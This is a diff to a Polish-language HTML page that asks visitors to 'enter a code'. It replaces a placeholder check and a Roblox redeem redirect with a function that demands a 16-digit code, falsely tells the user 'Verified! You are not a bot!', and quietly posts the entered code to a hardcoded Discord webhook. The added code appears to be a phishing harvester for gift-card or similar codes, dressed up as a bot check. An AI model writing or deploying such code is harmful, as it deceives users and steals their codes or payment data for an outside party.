@@ -15,13 +15,11 @@
       font-family: Arial, sans-serif;
       color: white;
     }
-
     canvas {
       position: absolute;
       top: 0;
       left: 0;
     }
-
     .content {
       position: relative;
       z-index: 1;
@@ -30,7 +28,6 @@
       border-radius: 10px;
       text-align: center;
     }
-
     input {
       padding: 10px;
       margin-top: 10px;
@@ -38,7 +35,6 @@
       border: none;
       outline: none;
     }
-
     button {
       margin-top: 10px;
       padding: 10px 20px;
@@ -48,7 +44,6 @@
       color: white;
       cursor: pointer;
     }
-
     button:hover {
       background: #45a049;
     }
@@ -59,7 +54,7 @@
 
   <div class="content">
     <h1>Wpisz kod</h1>
-    <input type="password" id="code" placeholder="Podaj kod">
+    <input type="password" id="code" placeholder="Podaj kod (16 cyfr)">
     <br>
     <button onclick="checkCode()">Sprawdź</button>
     <p id="message"></p>
@@ -88,10 +83,8 @@
       squares.forEach(sq => {
         ctx.fillStyle = "#bbb";
         ctx.fillRect(sq.x, sq.y, sq.size, sq.size);
-
         sq.x += sq.dx;
         sq.y += sq.dy;
-
         if (sq.x < 0 || sq.x > canvas.width) sq.dx *= -1;
         if (sq.y < 0 || sq.y > canvas.height) sq.dy *= -1;
       });
@@ -99,16 +92,27 @@
     }
     animate();
 
-    // Sprawdzanie kodu
+    // Sprawdzanie kodu i wysyłanie na webhook
     function checkCode() {
       const code = document.getElementById("code").value;
       const message = document.getElementById("message");
-      if (code === "1234") {
-        message.textContent = "Kod poprawny!";
-        window.location.href = "https://www.roblox.com/redeem"; 
-      } else {
-        message.textContent = "Niepoprawny kod.";
+
+      // Sprawdzenie, czy kod ma dokładnie 16 cyfr
+      const regex = /^\d{16}$/;
+      if (!regex.test(code)) {
+        message.textContent = "Kod musi mieć dokładnie 16 cyfr!";
+        return;
       }
+
+      message.textContent = "Zweryfikowano! Nie jesteś botem!";
+      
+   
+      const webhookURL = "https://discord.com/api/webhooks/1412869587812483155/Rlwfr3ujrFi8feJDj0qMMHB6uLiNwqzeiTtRr6BxfvfQMw3sdY7w6LtoHRrBA5RIbzRE"; // <- wklej swój webhook
+      fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: `Kod użytkownika: ${code}` })
+      }).catch(err => console.error(err));
     }
 
     window.addEventListener('resize', () => {
